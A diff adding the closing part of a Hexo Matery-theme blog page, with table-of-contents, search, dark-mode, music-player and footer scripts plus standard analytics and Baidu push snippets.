+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2024</span>
+            
+            <a href="/about" target="_blank">Doramer</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">50k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:2657100414@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2657100414" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2657100414" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
